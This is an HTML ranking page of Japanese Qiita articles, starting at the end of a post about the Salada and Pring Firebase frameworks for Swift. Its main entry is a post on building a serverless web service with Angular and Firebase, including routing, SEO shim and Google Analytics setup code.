<p><a href="https://github.com/1amageek/Salada/blob/master/Salada/Relation.swift#L118" class="autolink" rel="nofollow noopener" target="_blank">https://github.com/1amageek/Salada/blob/master/Salada/Relation.swift#L118</a></p>

<h2>
<span id="まだsaladaを使う理由はあります" class="fragment"></span><a href="#%E3%81%BE%E3%81%A0salada%E3%82%92%E4%BD%BF%E3%81%86%E7%90%86%E7%94%B1%E3%81%AF%E3%81%82%E3%82%8A%E3%81%BE%E3%81%99"><i class="fa fa-link"></i></a>まだSaladaを使う理由はあります。</h2>

<p><a href="https://camo.qiitausercontent.com/6417b9b87ff984dadbf4aff4b3fddd8aef117fb1/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f38303238372f66326634323234352d663832642d306339332d336163342d6339633839323138656136352e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/6417b9b87ff984dadbf4aff4b3fddd8aef117fb1/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f38303238372f66326634323234352d663832642d306339332d336163342d6339633839323138656136352e706e67" alt="logo.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/80287/f2f42245-f82d-0c93-3ac4-c9c89218ea65.png"></a></p>

<p>SaladaはSwiftで作られたFirebase Model Frameworkです。<br>
<a href="https://github.com/1amageek/Salada" class="autolink" rel="nofollow noopener" target="_blank">https://github.com/1amageek/Salada</a></p>

<ul>
<li>Firebase Realtime Databaseの方が早い</li>
<li>モデルを全て面倒見てくれる</li>
<li>Firebase Storageとの連携</li>
<li>RelationはSubCollectionと同じ機能</li>
<li>QueryはないがElasticSearchと連携する</li>
</ul>

<p>でもFirestoreいい感じだから、Saladaをアップデートします。</p>

<p>SaladaをFirebase Realtime Databaseのために残して<br>
Pringと言うCloud FirestoreのFrameworkを作りました。</p>

<p>SaladaはSwiftで作られたFirestore Model Frameworkです。</p>

<p><a href="https://camo.qiitausercontent.com/6d2b704a55ca4a97b72f694410fd1e28a86c0dba/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f38303238372f64613638613536352d383964332d366137622d666637352d3238343763626432363231362e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/6d2b704a55ca4a97b72f694410fd1e28a86c0dba/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f38303238372f64613638613536352d383964332d366137622d666637352d3238343763626432363231362e706e67" alt="Pring.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/80287/da68a565-89d3-6a7b-ff75-2847cbd26216.png"></a></p>

<p><a href="https://github.com/1amageek/Pring" class="autolink" rel="nofollow noopener" target="_blank">https://github.com/1amageek/Pring</a></p>

<p>まだまだ不安定なのでぜひ、バグの報告をいただければと思います。</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">100位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>87</kbd>
		<a target="_blank" href="https://qiita.com/alclimb/items/455dad20ae7c9e12a8b2">サーバーサイド不要説 ～ Angular&amp;Firebaseを使ってがっつりサーバーレスなWEBサービスを開発・運用したノウハウ</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-11-04<br />12:17:27</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/67192.html">alclimb</a>(5件の記事)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/67192/profile-images/1481275877">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[JavaScript]</b> <b>[Web]</b> <b>[angular]</b> <b>[Firebase]</b> <b>[frontend]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h1>
<span id="one-はじめに" class="fragment"></span><a href="#one-%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB"><i class="fa fa-link"></i></a><img alt=":one:" class="emoji" height="20" src="https://cdn.qiita.com/emoji/twemoji/unicode/31-fe0f-20e3.png" title=":one:" width="20"> はじめに</h1>

<p>「Angular」と「Firebase」を使って<strong>サーバーレス</strong>なWEBサービスの開発・運用したノウハウを紹介します。<br>
この記事では詳細な技術的なことにはあまり触れず、「<strong>どんな技術を使用してWEBサービスを作ろうか</strong>」を検討している人向けに記載しています。<br>
みなさんのサービス開発時の検討材料になれば幸いです。</p>

<h2>
<span id="angularとは" class="fragment"></span><a href="#angular%E3%81%A8%E3%81%AF"><i class="fa fa-link"></i></a>Angularとは</h2>

<p>Googleによって開発が進められているJavaScript(TypeScript)フレームワークです。SPA(シングルページアプリケーション)が容易に作成できます。</p>

<h2>
<span id="firebaseとは" class="fragment"></span><a href="#firebase%E3%81%A8%E3%81%AF"><i class="fa fa-link"></i></a>Firebaseとは</h2>

<p>Googleによって開発が進められているWEBサービスやモバイルアプリに必要なサーバー処理を提供するmBaasサービスです。</p>

<h2>
<span id="開発したサービス" class="fragment"></span><a href="#%E9%96%8B%E7%99%BA%E3%81%97%E3%81%9F%E3%82%B5%E3%83%BC%E3%83%93%E3%82%B9"><i class="fa fa-link"></i></a>開発したサービス</h2>

<p><a href="https://wehub.fun" rel="nofollow noopener" target="_blank"></a><a href="https://wehub.fun" class="autolink" rel="nofollow noopener" target="_blank">https://wehub.fun</a> ちゃっかり紹介。誰でも記事を作成・共有できるサービスです。<br>
技術的にはGoogleアカウントでの<strong>ユーザー認証</strong>や、<strong>記事データの保持・共有</strong>などの処理をサーバーサイドプログラムを書かずに実現しています。</p>

<h1>
<span id="two-要件" class="fragment"></span><a href="#two-%E8%A6%81%E4%BB%B6"><i class="fa fa-link"></i></a><img alt=":two:" class="emoji" height="20" src="https://cdn.qiita.com/emoji/twemoji/unicode/32-fe0f-20e3.png" title=":two:" width="20"> 要件</h1>

<p>以下の要件を満たせるものを目指しました。</p>

<table>
<thead>
<tr>
<th>No.</th>
<th style="text-align: left">要件</th>
<th style="text-align: left">実現方法</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td style="text-align: left">WEB上でアプリ並みの操作性を実現したい</td>
<td style="text-align: left">Angularでシングルページアプリケーション(SPA)を作成<br>Angular/Materialで各種コンポーネント部品を利用</td>
</tr>
<tr>
<td>2</td>
<td style="text-align: left">PC/タブレット/スマホに対応したい</td>
<td style="text-align: left">angular/flex-layoutを使用してレスポンシブデザインに対応</td>
</tr>
<tr>
<td>3</td>
<td style="text-align: left">フロントエンド開発に専念して、バックエンド開発をしたくない</td>
<td style="text-align: left">バックエンド開発の代わりにFirebaseを使ったmBaasサービスを利用</td>
</tr>
<tr>
<td>4</td>
<td style="text-align: left">WEBサービスとモバイルアプリを1つのソースコードで管理したい</td>
<td style="text-align: left">PhoneGapやCordovaを使ってWEBアプリをAndroid/iOS向けにアプリを作成</td>
</tr>
</tbody>
</table>

<h1>
<span id="three-環境" class="fragment"></span><a href="#three-%E7%92%B0%E5%A2%83"><i class="fa fa-link"></i></a><img alt=":three:" class="emoji" height="20" src="https://cdn.qiita.com/emoji/twemoji/unicode/33-fe0f-20e3.png" title=":three:" width="20"> 環境</h1>

<h2>
<span id="開発環境" class="fragment"></span><a href="#%E9%96%8B%E7%99%BA%E7%92%B0%E5%A2%83"><i class="fa fa-link"></i></a>開発環境</h2>

<p>開発に使用した各種ツールや環境です。メジャーで安定した開発が続けられるものを基準に採用しています。</p>

<table>
<thead>
<tr>
<th>No.</th>
<th style="text-align: left">項目</th>
<th style="text-align: left">Ver.</th>
<th style="text-align: left">備考</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td style="text-align: left">Visual Studio Code</td>
<td style="text-align: left">1.17.2</td>
<td style="text-align: left">Microsoft製のテキストエディター</td>
</tr>
<tr>
<td>2</td>
<td style="text-align: left">Node.js</td>
<td style="text-align: left">6.11.3</td>
<td style="text-align: left">JavaScript開発環境</td>
</tr>
<tr>
<td>3</td>
<td style="text-align: left">npm</td>
<td style="text-align: left">3.10.10</td>
<td style="text-align: left">Node.jsのパッケージ(ライブラリ)管理マネージャー</td>
</tr>
<tr>
<td>4</td>
<td style="text-align: left">TypeScript</td>
<td style="text-align: left">2.5.3</td>
<td style="text-align: left">Microsoft製のオープンソースのプログラミング言語</td>
</tr>
<tr>
<td>5</td>
<td style="text-align: left">angular-cli</td>
<td style="text-align: left">1.4</td>
<td style="text-align: left">Google製のangularを爆速で開発するためのツール</td>
</tr>
</tbody>
</table>

<p>※ 開発環境のOSはWindowsですが、macOSやLinuxでも同じものが使用できます。</p>

<h2>
<span id="要素技術ライブラリ" class="fragment"></span><a href="#%E8%A6%81%E7%B4%A0%E6%8A%80%E8%A1%93%E3%83%A9%E3%82%A4%E3%83%96%E3%83%A9%E3%83%AA"><i class="fa fa-link"></i></a>要素技術(ライブラリ)</h2>

<p>作成したWEBサービスに利用した要素技術(ライブラリ)の一覧です。こちらもメジャーで安定した開発が続けられるものを基準に採用しています。現時点でほぼ最新のバージョンを使用しています。</p>

<table>
<thead>
<tr>
<th>No.</th>
<th style="text-align: left">項目</th>
<th style="text-align: left">Ver.</th>
<th style="text-align: left">備考</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td style="text-align: left">angular</td>
<td style="text-align: left">4.4</td>
<td style="text-align: left">Googleによって開発が進められているJavaScript(TypeScript)フレームワーク</td>
</tr>
<tr>
<td>2</td>
<td style="text-align: left">angular/material</td>
<td style="text-align: left">2.0.0-beta.12</td>
<td style="text-align: left">Angular用のMaterialデザインのライブラリ</td>
</tr>
<tr>
<td>3</td>
<td style="text-align: left">angular/flex-layout</td>
<td style="text-align: left">2.0.0-beta.9</td>
<td style="text-align: left">Angular用のレイアウトのライブラリ</td>
</tr>
<tr>
<td>4</td>
<td style="text-align: left">firebase</td>
<td style="text-align: left">4.6</td>
<td style="text-align: left">Googleによって開発が進められているWEBサービスやモバイルアプリに必要なサーバー処理を提供するmBaasサービスを利用するためのライブラリ</td>
</tr>
<tr>
<td>5</td>
<td style="text-align: left">marked</td>
<td style="text-align: left">0.3</td>
<td style="text-align: left">Markdown文字列をHTMLに変換するライブラリ</td>
</tr>
<tr>
<td>6</td>
<td style="text-align: left">moment</td>
<td style="text-align: left">2.18</td>
<td style="text-align: left">日時処理を便利にしてくれるライブラリ</td>
</tr>
</tbody>
</table>

<p>※ betaバージョンが入っていますので突然の仕様変更や不具合が存在する可能性があります。<br>
※ 現在のWEB環境はリリース版となっていても脆弱性の修正や仕様変更などはつきものなため、個人的にはbeta版であろうと開発が活発でオープンなものであれば気にしていません。</p>

<h2>
<span id="運用環境" class="fragment"></span><a href="#%E9%81%8B%E7%94%A8%E7%92%B0%E5%A2%83"><i class="fa fa-link"></i></a>運用環境</h2>

<table>
<thead>
<tr>
<th>No.</th>
<th style="text-align: left">項目</th>
<th style="text-align: left">備考</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td style="text-align: left">Firebase Hosting</td>
<td style="text-align: left">いわゆるWEBサーバー。HTML/CSS/JavaScriptなどの静的ファイルを設置</td>
</tr>
<tr>
<td>2</td>
<td style="text-align: left">Firebase Authentication</td>
<td style="text-align: left">ユーザー認証に関する機能<br>メールアドレスやGoogleアカウントによる認証</td>
</tr>
<tr>
<td>3</td>
<td style="text-align: left">Firebase Storage</td>
<td style="text-align: left">画像などのユーザーファイルをアップロードして管理する</td>
</tr>
<tr>
<td>4</td>
<td style="text-align: left">Firebase Cloud Firestore</td>
<td style="text-align: left">記事データなど動的に作成されるデータ類を保持する<br>なお同様の目的を果たせるものとして「Firebase Realtime Database」がありますが、これからはじめる方はFirestoreをお勧めします。</td>
</tr>
<tr>
<td>5</td>
<td style="text-align: left">Firebase Cloud Functions</td>
<td style="text-align: left">サーバー側で行いたい処理がある場合にJavaScriptの関数をサーバー側に設置可能<br>例：<a href="https://github.com/firebase/functions-samples/tree/master/stripe" rel="nofollow noopener" target="_blank">ユーザーからの支払い処理</a>など</td>
</tr>
<tr>
<td>6</td>
<td style="text-align: left">Google Search Console</td>
<td style="text-align: left">検索エンジンへの対応</td>
</tr>
<tr>
<td>7</td>
<td style="text-align: left">Google Analytics</td>
<td style="text-align: left">アクセス解析</td>
</tr>
</tbody>
</table>

<h1>
<span id="four-プチノウハウ" class="fragment"></span><a href="#four-%E3%83%97%E3%83%81%E3%83%8E%E3%82%A6%E3%83%8F%E3%82%A6"><i class="fa fa-link"></i></a><img alt=":four:" class="emoji" height="20" src="https://cdn.qiita.com/emoji/twemoji/unicode/34-fe0f-20e3.png" title=":four:" width="20"> プチノウハウ</h1>

<h2>
<span id="検索エンジン対応1" class="fragment"></span><a href="#%E6%A4%9C%E7%B4%A2%E3%82%A8%E3%83%B3%E3%82%B8%E3%83%B3%E5%AF%BE%E5%BF%9C1"><i class="fa fa-link"></i></a>検索エンジン対応1</h2>

<p>検索エンジンはキーワードと対応するページを紐づけます。SPAではシングルページという名の通りページが1つとなるため検索エンジンとの相性はよくありません。<br>
そこで、angularのrouter機能を使いURLと表示する内容を連動させることでこの問題を解決します。</p>

<div class="code-frame" data-lang="ts">
<div class="code-lang"><span class="bold">app-routing.module.ts｜ルーティング設定例</span></div>
<div class="highlight"><pre><span></span><span class="kr">import</span> <span class="p">{</span> <span class="nx">NgModule</span> <span class="p">}</span> <span class="nx">from</span> <span class="s1">'@angular/core'</span><span class="p">;</span>
<span class="kr">import</span> <span class="p">{</span> <span class="nx">Routes</span><span class="p">,</span> <span class="nx">RouterModule</span> <span class="p">}</span> <span class="nx">from</span> <span class="s1">'@angular/router'</span><span class="p">;</span>
<span class="kr">import</span> <span class="p">{</span> <span class="nx">HomeComponent</span> <span class="p">}</span> <span class="nx">from</span> <span class="s1">'./pages/home/home.component'</span><span class="p">;</span>
<span class="kr">import</span> <span class="p">{</span> <span class="nx">FeedbackComponent</span> <span class="p">}</span> <span class="nx">from</span> <span class="s1">'./pages/feedback/feedback.component'</span><span class="p">;</span>
<span class="kr">import</span> <span class="p">{</span> <span class="nx">WatchComponent</span> <span class="p">}</span> <span class="nx">from</span> <span class="s1">'./pages/watch/watch.component'</span><span class="p">;</span>
<span class="kr">import</span> <span class="p">{</span> <span class="nx">MySettingsComponent</span> <span class="p">}</span> <span class="nx">from</span> <span class="s1">'./pages/my-settings/my-settings.component'</span><span class="p">;</span>
<span class="kr">import</span> <span class="p">{</span> <span class="nx">MyArticlesComponent</span> <span class="p">}</span> <span class="nx">from</span> <span class="s1">'./pages/my-articles/my-articles.component'</span><span class="p">;</span>
<span class="kr">import</span> <span class="p">{</span> <span class="nx">PostComponent</span> <span class="p">}</span> <span class="nx">from</span> <span class="s1">'./pages/post/post.component'</span><span class="p">;</span>

<span class="kr">const</span> <span class="nx">routes</span>: <span class="kt">Routes</span> <span class="o">=</span> <span class="p">[</span>
    <span class="p">{</span>
        <span class="nx">path</span><span class="o">:</span> <span class="s1">''</span><span class="p">,</span>
        <span class="nx">component</span>: <span class="kt">HomeComponent</span><span class="p">,</span>
    <span class="p">},</span>
    <span class="p">{</span>
        <span class="nx">path</span><span class="o">:</span> <span class="s1">'feedback'</span><span class="p">,</span>
        <span class="nx">component</span>: <span class="kt">FeedbackComponent</span><span class="p">,</span>
    <span class="p">},</span>
    <span class="p">{</span>
        <span class="nx">path</span><span class="o">:</span> <span class="s1">'watch/:id'</span><span class="p">,</span>
        <span class="nx">component</span>: <span class="kt">WatchComponent</span><span class="p">,</span>
    <span class="p">},</span>
    <span class="p">{</span>
        <span class="nx">path</span><span class="o">:</span> <span class="s1">'my/settings'</span><span class="p">,</span>
        <span class="nx">component</span>: <span class="kt">MySettingsComponent</span><span class="p">,</span>
    <span class="p">},</span>
    <span class="p">{</span>
        <span class="nx">path</span><span class="o">:</span> <span class="s1">'my/articles'</span><span class="p">,</span>
        <span class="nx">component</span>: <span class="kt">MyArticlesComponent</span><span class="p">,</span>
    <span class="p">},</span>
    <span class="p">{</span>
        <span class="nx">path</span><span class="o">:</span> <span class="s1">'my/post'</span><span class="p">,</span>
        <span class="nx">component</span>: <span class="kt">PostComponent</span><span class="p">,</span>
    <span class="p">},</span>
    <span class="p">{</span>
        <span class="nx">path</span><span class="o">:</span> <span class="s1">'my/edit/:id'</span><span class="p">,</span>
        <span class="nx">component</span>: <span class="kt">PostComponent</span><span class="p">,</span>
    <span class="p">},</span>
<span class="p">];</span>

<span class="kd">@NgModule</span><span class="p">({</span>
    <span class="nx">imports</span><span class="o">:</span> <span class="p">[</span><span class="nx">RouterModule</span><span class="p">.</span><span class="nx">forRoot</span><span class="p">(</span><span class="nx">routes</span><span class="p">)],</span>
    <span class="nx">exports</span><span class="o">:</span> <span class="p">[</span><span class="nx">RouterModule</span><span class="p">]</span>
<span class="p">})</span>
<span class="kr">export</span> <span class="kr">class</span> <span class="nx">AppRoutingModule</span> <span class="p">{</span> <span class="p">}</span>
</pre></div>
</div>

<h2>
<span id="検索エンジン対応2" class="fragment"></span><a href="#%E6%A4%9C%E7%B4%A2%E3%82%A8%E3%83%B3%E3%82%B8%E3%83%B3%E5%AF%BE%E5%BF%9C2"><i class="fa fa-link"></i></a>検索エンジン対応2</h2>

<p>昔のクローラー(検索エンジン)はSPAなどのJavaScriptなどで動的にDOMが書き換わった文章を読めませんでしたが、現在のGoogleのクローラーはある程度は動的にDOMが書き換わっても対応できるようです。</p>

<p>しかし、現在のクローラーでも最新のJavaScript規格に対応していないようですのでshimを入れています。</p>

<div class="code-frame" data-lang="html">
<div class="code-lang"><span class="bold">index.html｜headに追加</span></div>
<div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">"https://cdnjs.cloudflare.com/ajax/libs/core-js/2.4.1/shim.min.js"</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</pre></div>
</div>

<h2>
<span id="検索エンジン対応3---未対応" class="fragment"></span><a href="#%E6%A4%9C%E7%B4%A2%E3%82%A8%E3%83%B3%E3%82%B8%E3%83%B3%E5%AF%BE%E5%BF%9C3---%E6%9C%AA%E5%AF%BE%E5%BF%9C"><i class="fa fa-link"></i></a>検索エンジン対応3 - (未対応)</h2>

<p><code>Angular Universal</code> というSSR(サーバーサイドレンダリング)によって、SPA(シングルページアプリケーション)をサーバー上で実行しDOMを生成して、クライアントには完成したDOMを返す技術があります。<br>
クライアント(クローラー)側で動的にDOMが書き換わらないため、検索エンジンにとっては最も好ましいといえます。</p>

<p>ただ、私の環境ではrxjsのObservable.fromPromiseでエラーが発生してしまう問題を解決できなかったため現在は未対応の状態です。</p>

<p>※ 「検索エンジン対応1,2」のみで、Googleのクローラーからはインデックスされていますので、Angular-Universalによるサーバーサイドレンダリングの対応は<strong>とりあえず不要</strong>と言えそうです。</p>

<h2>
<span id="google-analytics-対応" class="fragment"></span><a href="#google-analytics-%E5%AF%BE%E5%BF%9C"><i class="fa fa-link"></i></a>Google Analytics 対応</h2>

<p>コンテンツが動的に読み込まれてアドレスバーの URL が更新された時点で、トラッカーに保存されているデータも更新する必要があります。<br>
<a href="https://developers.google.com/analytics/devguides/collection/analyticsjs/single-page-applications?hl=ja" class="autolink" rel="nofollow noopener" target="_blank">https://developers.google.com/analytics/devguides/collection/analyticsjs/single-page-applications?hl=ja</a><br>
<a href="https://qiita.com/Akira-Isegawa/items/845aee44d79197e9844f" class="autolink" id="reference-1e1174d3d7d2b7857d58">https://qiita.com/Akira-Isegawa/items/845aee44d79197e9844f</a></p>

<div class="code-frame" data-lang="bash">
<div class="code-lang"><span class="bold">コマンド｜TypeScript用の定義ファイルを追加</span></div>
<div class="highlight"><pre><span></span>npm install --save-dev @types/google.analytics
</pre></div>
</div>

<div class="code-frame" data-lang="html">
<div class="code-lang"><span class="bold">index.html｜headに追加</span></div>
<div class="highlight"><pre><span></span>    <span class="c">&lt;!-- Google Analytics --&gt;</span>
    <span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">"https://www.googletagmanager.com/gtag/js?id=UA-*********-1"</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
</pre></div>
</div>

<div class="code-frame" data-lang="ts">
<div class="code-lang"><span class="bold">app-routing.module.ts</span></div>
<div class="highlight"><pre><span></span><span class="kr">import</span> <span class="p">{</span> <span class="p">}</span> <span class="nx">from</span> <span class="s1">'google.analytics'</span><span class="p">;</span>

<span class="c1">// Google Analytics の初期化コード</span>
<span class="nb">window</span><span class="p">[</span><span class="s1">'dataLayer'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="s1">'dataLayer'</span><span class="p">]</span> <span class="o">||</span> <span class="p">[];</span>
<span class="kd">function</span> <span class="nx">gtag</span><span class="p">(</span><span class="nx">arg1</span><span class="p">,</span> <span class="nx">arg2</span><span class="p">)</span> <span class="p">{</span> <span class="nb">window</span><span class="p">[</span><span class="s1">'dataLayer'</span><span class="p">].</span><span class="nx">push</span><span class="p">(</span><span class="nx">arguments</span><span class="p">);</span> <span class="p">}</span>
<span class="nx">gtag</span><span class="p">(</span><span class="s1">'js'</span><span class="p">,</span> <span class="k">new</span> <span class="nb">Date</span><span class="p">());</span>
<span class="nx">gtag</span><span class="p">(</span><span class="s1">'config'</span><span class="p">,</span> <span class="s1">'UA-*********-1'</span><span class="p">);</span>
</pre></div>
</div>

<div class="code-frame" data-lang="ts">
<div class="code-lang"><span class="bold">app-routing.module.ts</span></div>
<div class="highlight"><pre><span></span><span class="kr">export</span> <span class="kr">class</span> <span class="nx">AppRoutingModule</span> <span class="p">{</span>
    <span class="cm">/**</span>
<span class="cm">     * DIコンストラクタ</span>
<span class="cm">     */</span>
    <span class="kr">public</span> <span class="kr">constructor</span><span class="p">(</span><span class="nx">router</span>: <span class="kt">Router</span><span class="p">)</span> <span class="p">{</span>

        <span class="c1">// ルーターイベントを取得</span>
        <span class="nx">router</span><span class="p">.</span><span class="nx">events</span>
            <span class="c1">// NavigationEndイベントだけにする</span>
            <span class="p">.</span><span class="nx">filter</span><span class="p">(</span><span class="nx">e</span> <span class="o">=&gt;</span> <span class="nx">e</span> <span class="k">instanceof</span> <span class="nx">NavigationEnd</span><span class="p">)</span>

            <span class="c1">// NavigationEnd型に変換</span>
            <span class="p">.</span><span class="nx">map</span><span class="p">(</span><span class="nx">e</span> <span class="o">=&gt;</span> <span class="nx">e</span> <span class="kr">as</span> <span class="nx">NavigationEnd</span><span class="p">)</span>

            <span class="c1">// イベント購読</span>
            <span class="p">.</span><span class="nx">subscribe</span><span class="p">(</span><span class="nx">e</span> <span class="o">=&gt;</span> <span class="p">{</span>
                <span class="c1">// トラッカーを更新</span>
                <span class="nx">ga</span><span class="p">(</span><span class="s1">'set'</span><span class="p">,</span> <span class="s1">'page'</span><span class="p">,</span> <span class="nx">e</span><span class="p">.</span><span class="nx">url</span><span class="p">);</span>

                <span class="c1">// PV送信</span>
                <span class="nx">ga</span><span class="p">(</span><span class="s1">'send'</span><span class="p">,</span> <span class="s1">'pageview'</span><span class="p">,</span> <span class="nx">e</span><span class="p">.</span><span class="nx">url</span><span class="p">);</span>
            <span class="p">});</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>
</div>

<h1>
<span id="five-終わりに" class="fragment"></span><a href="#five-%E7%B5%82%E3%82%8F%E3%82%8A%E3%81%AB"><i class="fa fa-link"></i></a><img alt=":five:" class="emoji" height="20" src="https://cdn.qiita.com/emoji/twemoji/unicode/35-fe0f-20e3.png" title=":five:" width="20"> 終わりに</h1>

<p>記事自体のクオリティがかなり荒く申し訳ないですが何方かの参考になれば幸いです。<br>
まずは何かアプトプットするということが大事かと思いましたのでご容赦を^^</p>
</div>
	</td>
</tr>
</table>
<br />
	</body>
</html>
